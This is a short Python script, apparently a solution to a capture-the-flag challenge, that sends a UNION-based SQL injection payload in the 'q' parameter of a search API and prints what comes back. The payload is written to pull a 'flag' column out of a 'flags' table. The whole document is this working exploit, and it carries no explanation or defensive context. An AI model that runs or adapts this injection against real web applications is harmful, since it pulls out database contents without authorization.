import requests

url = "https://browser.ctf.ptr.si/api/search"
params = {
    "q": r"'' UNION SELECT 1,flag,1,1,1,1 FROM flags -- "
}
response = requests.get(url, params=params)
print(response.text)
